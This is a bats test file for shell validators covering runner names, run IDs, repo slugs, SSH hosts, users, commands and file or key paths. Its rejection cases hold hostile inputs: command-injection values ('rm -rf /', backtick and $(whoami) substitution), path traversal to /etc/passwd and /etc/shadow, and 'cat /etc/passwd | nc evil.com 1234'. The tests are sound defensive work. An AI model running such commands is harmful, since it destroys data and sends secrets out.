#!/usr/bin/env bats
# validate.bats — Tests for hooks/scripts/lib/validate.sh

setup() {
  SCRIPT_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")/../hooks/scripts" && pwd)"
  # shellcheck source=../hooks/scripts/lib/validate.sh
  . "${SCRIPT_DIR}/lib/validate.sh"
}

# --- validate_runner_name ---

@test "runner_name: valid simple name" {
  run validate_runner_name "runner-01"
  [ "$status" -eq 0 ]
}

@test "runner_name: valid single char" {
  run validate_runner_name "r"
  [ "$status" -eq 0 ]
}

@test "runner_name: valid all digits" {
  run validate_runner_name "01"
  [ "$status" -eq 0 ]
}

@test "runner_name: valid long name" {
  run validate_runner_name "my-super-long-runner-name-that-is-still-valid-01"
  [ "$status" -eq 0 ]
}

@test "runner_name: reject empty" {
  run validate_runner_name ""
  [ "$status" -eq 1 ]
}

@test "runner_name: reject uppercase" {
  run validate_runner_name "Runner-01"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject leading hyphen" {
  run validate_runner_name "-runner"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject trailing hyphen" {
  run validate_runner_name "runner-"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject spaces" {
  run validate_runner_name "runner 01"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject path traversal (..)" {
  run validate_runner_name "../etc"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject slash" {
  run validate_runner_name "runner/01"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject tilde" {
  run validate_runner_name "runner~01"
  [ "$status" -eq 1 ]
}

@test "runner_name: reject newline" {
  run validate_runner_name $'runner\n01'
  [ "$status" -eq 1 ]
}

@test "runner_name: reject 65+ chars" {
  local long_name
  long_name=$(printf 'a%.0s' {1..65})
  run validate_runner_name "$long_name"
  [ "$status" -eq 1 ]
}

# --- validate_run_id ---

@test "run_id: valid simple" {
  run validate_run_id "123456789"
  [ "$status" -eq 0 ]
}

@test "run_id: valid single digit" {
  run validate_run_id "1"
  [ "$status" -eq 0 ]
}

@test "run_id: valid large number" {
  run validate_run_id "9007199254740991"
  [ "$status" -eq 0 ]
}

@test "run_id: reject empty" {
  run validate_run_id ""
  [ "$status" -eq 1 ]
}

@test "run_id: reject zero" {
  run validate_run_id "0"
  [ "$status" -eq 1 ]
}

@test "run_id: reject leading zero" {
  run validate_run_id "0123"
  [ "$status" -eq 1 ]
}

@test "run_id: reject letters" {
  run validate_run_id "abc123"
  [ "$status" -eq 1 ]
}

@test "run_id: reject negative" {
  run validate_run_id "-123"
  [ "$status" -eq 1 ]
}

@test "run_id: reject too many digits" {
  run validate_run_id "12345678901234567890123"
  [ "$status" -eq 1 ]
}

@test "run_id: reject newline injection" {
  run validate_run_id $'123\n456'
  [ "$status" -eq 1 ]
}

# --- validate_repo_slug ---

@test "repo_slug: valid simple" {
  run validate_repo_slug "owner/repo"
  [ "$status" -eq 0 ]
}

@test "repo_slug: valid with hyphens" {
  run validate_repo_slug "king-yellow/my-repo"
  [ "$status" -eq 0 ]
}

@test "repo_slug: valid with dots" {
  run validate_repo_slug "owner/repo.js"
  [ "$status" -eq 0 ]
}

@test "repo_slug: valid with underscores" {
  run validate_repo_slug "owner/my_repo"
  [ "$status" -eq 0 ]
}

@test "repo_slug: reject empty" {
  run validate_repo_slug ""
  [ "$status" -eq 1 ]
}

@test "repo_slug: reject no slash" {
  run validate_repo_slug "justrepo"
  [ "$status" -eq 1 ]
}

@test "repo_slug: reject double slash" {
  run validate_repo_slug "owner/sub/repo"
  [ "$status" -eq 1 ]
}

@test "repo_slug: reject path traversal" {
  run validate_repo_slug "owner/..repo"
  [ "$status" -eq 1 ]
}

@test "repo_slug: reject leading dot in repo" {
  run validate_repo_slug "owner/.hidden"
  [ "$status" -eq 1 ]
}

@test "repo_slug: reject trailing dot in repo" {
  run validate_repo_slug "owner/repo."
  [ "$status" -eq 1 ]
}

# --- validate_ssh_host ---

@test "ssh_host: valid private 192.168.x.x" {
  run validate_ssh_host "192.168.1.50"
  [ "$status" -eq 0 ]
}

@test "ssh_host: valid private 10.x.x.x" {
  run validate_ssh_host "10.0.0.1"
  [ "$status" -eq 0 ]
}

@test "ssh_host: valid private 172.16.x.x" {
  run validate_ssh_host "172.16.0.1"
  [ "$status" -eq 0 ]
}

@test "ssh_host: valid localhost" {
  run validate_ssh_host "127.0.0.1"
  [ "$status" -eq 0 ]
}

@test "ssh_host: valid FQDN" {
  run validate_ssh_host "runner-01.local"
  [ "$status" -eq 0 ]
}

@test "ssh_host: reject public IP" {
  run validate_ssh_host "8.8.8.8"
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject empty" {
  run validate_ssh_host ""
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject semicolon injection" {
  run validate_ssh_host "192.168.1.1;rm -rf /"
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject backtick injection" {
  run validate_ssh_host '192.168.1.1`whoami`'
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject dollar injection" {
  run validate_ssh_host '$(whoami).evil.com'
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject integer-overflowing octet" {
  run validate_ssh_host "10.0.0.99999999999999999999"
  [ "$status" -eq 1 ]
}

@test "ssh_host: reject octet >255" {
  run validate_ssh_host "192.168.1.256"
  [ "$status" -eq 1 ]
}

# --- validate_ssh_user ---

@test "ssh_user: valid simple" {
  run validate_ssh_user "runner"
  [ "$status" -eq 0 ]
}

@test "ssh_user: valid with underscore prefix" {
  run validate_ssh_user "_runner"
  [ "$status" -eq 0 ]
}

@test "ssh_user: valid with numbers" {
  run validate_ssh_user "runner01"
  [ "$status" -eq 0 ]
}

@test "ssh_user: reject empty" {
  run validate_ssh_user ""
  [ "$status" -eq 1 ]
}

@test "ssh_user: reject starts with number" {
  run validate_ssh_user "01runner"
  [ "$status" -eq 1 ]
}

@test "ssh_user: reject uppercase" {
  run validate_ssh_user "Runner"
  [ "$status" -eq 1 ]
}

@test "ssh_user: reject 33+ chars" {
  local long_name
  long_name=$(printf 'a%.0s' {1..33})
  run validate_ssh_user "$long_name"
  [ "$status" -eq 1 ]
}

# --- validate_cache_dir ---

@test "cache_dir: valid /home/runner/.cache" {
  run validate_cache_dir "/home/runner/.cache"
  [ "$status" -eq 0 ]
}

@test "cache_dir: valid /tmp/build" {
  run validate_cache_dir "/tmp/build"
  [ "$status" -eq 0 ]
}

@test "cache_dir: valid /var/cache/apt" {
  run validate_cache_dir "/var/cache/apt"
  [ "$status" -eq 0 ]
}

@test "cache_dir: reject /etc/passwd" {
  run validate_cache_dir "/etc/passwd"
  [ "$status" -eq 1 ]
}

@test "cache_dir: reject /root" {
  run validate_cache_dir "/root/.cache"
  [ "$status" -eq 1 ]
}

@test "cache_dir: reject path traversal" {
  run validate_cache_dir "/home/runner/../../etc"
  [ "$status" -eq 1 ]
}

@test "cache_dir: reject empty" {
  run validate_cache_dir ""
  [ "$status" -eq 1 ]
}

# --- validate_numeric_range ---

@test "numeric_range: valid within bounds" {
  run validate_numeric_range "5" "1" "10"
  [ "$status" -eq 0 ]
}

@test "numeric_range: valid at min" {
  run validate_numeric_range "3" "3" "60"
  [ "$status" -eq 0 ]
}

@test "numeric_range: valid at max" {
  run validate_numeric_range "60" "3" "60"
  [ "$status" -eq 0 ]
}

@test "numeric_range: reject below min" {
  run validate_numeric_range "1" "3" "60"
  [ "$status" -eq 1 ]
}

@test "numeric_range: reject above max" {
  run validate_numeric_range "100" "3" "60"
  [ "$status" -eq 1 ]
}

@test "numeric_range: reject non-numeric" {
  run validate_numeric_range "abc" "1" "10"
  [ "$status" -eq 1 ]
}

@test "numeric_range: reject empty" {
  run validate_numeric_range "" "1" "10"
  [ "$status" -eq 1 ]
}

# --- validate_ssh_command ---

@test "ssh_command: valid simple" {
  run validate_ssh_command "df -h"
  [ "$status" -eq 0 ]
}

@test "ssh_command: reject semicolon" {
  run validate_ssh_command "df -h; rm -rf /"
  [ "$status" -eq 1 ]
}

@test "ssh_command: reject pipe" {
  run validate_ssh_command "cat /etc/passwd | nc evil.com 1234"
  [ "$status" -eq 1 ]
}

@test "ssh_command: reject backtick" {
  run validate_ssh_command 'echo `whoami`'
  [ "$status" -eq 1 ]
}

@test "ssh_command: reject command substitution" {
  run validate_ssh_command 'echo $(whoami)'
  [ "$status" -eq 1 ]
}

@test "ssh_command: reject ampersand" {
  run validate_ssh_command "rm -rf / &"
  [ "$status" -eq 1 ]
}

@test "ssh_command: reject newline" {
  run validate_ssh_command $'df -h\nrm -rf /'
  [ "$status" -eq 1 ]
}

# --- validate_file_path ---

@test "file_path: valid relative path" {
  local tmpdir
  tmpdir=$(mktemp -d)
  mkdir -p "$tmpdir/src"
  touch "$tmpdir/src/main.sh"
  run validate_file_path "src/main.sh" "$tmpdir"
  [ "$status" -eq 0 ]
  rm -rf "$tmpdir"
}

@test "file_path: reject path traversal with .." {
  run validate_file_path "../etc/passwd" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: reject absolute path" {
  run validate_file_path "/etc/passwd" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: reject tilde path" {
  run validate_file_path "~/.ssh/id_rsa" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: reject empty path" {
  run validate_file_path "" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: reject newline injection" {
  local path_with_newline
  path_with_newline=$(printf 'safe\n../etc/passwd')
  run validate_file_path "$path_with_newline" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: reject carriage return injection" {
  local path_with_cr
  path_with_cr=$(printf 'safe\r../etc/passwd')
  run validate_file_path "$path_with_cr" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: valid nested path" {
  local tmpdir
  tmpdir=$(mktemp -d)
  mkdir -p "$tmpdir/a/b/c"
  touch "$tmpdir/a/b/c/file.txt"
  run validate_file_path "a/b/c/file.txt" "$tmpdir"
  [ "$status" -eq 0 ]
  rm -rf "$tmpdir"
}

@test "file_path: reject double-dot in middle" {
  run validate_file_path "src/../../../etc/passwd" "/home/user/project"
  [ "$status" -eq 1 ]
}

@test "file_path: valid file in root" {
  local tmpdir
  tmpdir=$(mktemp -d)
  touch "$tmpdir/README.md"
  run validate_file_path "README.md" "$tmpdir"
  [ "$status" -eq 0 ]
  rm -rf "$tmpdir"
}

# --- validate_ssh_key_path ---

@test "ssh_key_path: valid empty (default key)" {
  run validate_ssh_key_path ""
  [ "$status" -eq 0 ]
}

@test "ssh_key_path: valid tilde path" {
  run validate_ssh_key_path "~/.ssh/id_rsa"
  [ "$status" -eq 0 ]
}

@test "ssh_key_path: valid absolute path" {
  run validate_ssh_key_path "/home/runner/.ssh/id_ed25519"
  [ "$status" -eq 0 ]
}

@test "ssh_key_path: valid path with hyphens" {
  run validate_ssh_key_path "~/.ssh/runner-key"
  [ "$status" -eq 0 ]
}

@test "ssh_key_path: reject path traversal" {
  run validate_ssh_key_path "~/.ssh/../../../etc/passwd"
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject semicolon injection" {
  run validate_ssh_key_path "/tmp/key;rm -rf /"
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject backtick injection" {
  run validate_ssh_key_path '/tmp/key`whoami`'
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject pipe" {
  run validate_ssh_key_path "/tmp/key|evil"
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject dollar" {
  run validate_ssh_key_path '/tmp/$HOME/key'
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject relative path (no ~ or /)" {
  run validate_ssh_key_path "relative/path/key"
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject newline" {
  run validate_ssh_key_path $'/home/runner/.ssh/key\n/etc/shadow'
  [ "$status" -eq 1 ]
}

@test "ssh_key_path: reject spaces" {
  run validate_ssh_key_path "/tmp/my key"
  [ "$status" -eq 1 ]
}
